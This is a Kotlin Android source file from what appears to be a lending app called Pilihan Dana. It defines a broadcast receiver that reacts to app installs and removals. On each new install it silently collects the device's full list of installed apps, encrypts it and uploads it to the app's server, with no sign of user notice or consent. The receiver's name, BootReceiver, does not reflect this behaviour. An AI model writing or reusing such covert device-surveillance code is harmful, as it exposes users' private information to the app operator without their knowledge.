package id.pilihandana.rp.com.utils

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.widget.Toast
import id.pilihandana.rp.com.http.HttpUrl
import okhttp3.MediaType
import okhttp3.RequestBody
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import java.util.HashMap

class BootReceiver : BroadcastReceiver() {

     override fun onReceive(context: Context?, intent: Intent) {
        //接收安装广播
        if (intent.action == "android.intent.action.PACKAGE_ADDED") {
            val packageName = intent.dataString
            LogUtil.d("Pilihan_Dana安装了:" + packageName + "包")
            loadApps(context)
        }
        //接收卸载广播
        if (intent.action == "android.intent.action.PACKAGE_REMOVED") {
            val packageName = intent.dataString
            LogUtil.d("Pilihan_Dana卸载了:" + packageName + "包")
        }
    }
    private fun loadApps(context: Context?) {
        val list: List<String> =
            AppsBao().loadApps(context!!)
        val rmap: MutableMap<String?, Any?>? =
            HashMap()
        rmap?.set("packageList", list)
        var map: String? = ResUtils.createRequestData(rmap, context)
        map = ResUtils.encryptedStr(map.toString())
        HttpUrl.HttpUrlOk()!!.upApps(
            RequestBody.create(MediaType.parse("text/plain"), map)
        )!!.enqueue(object : Callback<String?> {
            override fun onResponse(
                call: Call<String?>,
                response: Response<String?>
            ) {
                val decrStr: String? = ResUtils.decryptStr(response.body())
                LogUtil.d("loadApps$decrStr")
            }

            override fun onFailure(
                call: Call<String?>,
                t: Throwable
            ) {
//                finish();
                Toast.makeText(context, t.message, Toast.LENGTH_SHORT).show()
                LogUtil.e(t)
            }
        })
    }
}